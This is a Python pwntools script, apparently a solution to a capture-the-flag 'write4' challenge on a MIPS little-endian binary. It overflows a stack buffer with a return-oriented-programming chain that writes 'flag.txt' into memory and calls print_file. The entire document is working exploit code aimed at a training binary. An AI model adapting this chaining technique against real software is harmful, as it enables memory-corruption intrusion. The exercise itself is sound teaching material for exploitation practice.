from pwn import *


lw_ra_jr_ra = 0x004006dc# lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
print_file_plt = 0x400a90
usefulGadgets = 0x400930 # lw t9,12(sp); lw t0,8(sp); lw t1,4(sp); sw t1,0(t0); jalr t9; addi sp,sp,16; lw a0,8(sp); lw t9,4(sp); jalr t9; nop
usefulGadgets2 = 0x400948 # lw a0,8(sp); lw t9,4(sp); jalr t9; nop
nonexistent_addr = 0x400b10

write_addr = 0x411000

context(arch="mips",endian="little")
elf = ELF("./write4_mipsel")

#p = gdb.debug(elf.path,'''
#        break pwnme
#        break *0x7f7b5984
#        break *0x400950
#        continue
#        ''')

p = process(elf.path)

p.recvuntil('> ')

buf = b'A' * 36

buf += p32(usefulGadgets)
buf += b'S'*4
buf += b'flag' # t1
buf += p32(write_addr) # t0
buf += p32(usefulGadgets)  # t9
buf += b'S'*4
buf += b'.txt' # t1
buf += p32(write_addr+4) # t0
buf += p32(usefulGadgets2)  # t9
buf += b'S'*4
buf += p32(print_file_plt) # t9
buf += p32(write_addr) # a0



p.send(buf)

p.interactive()
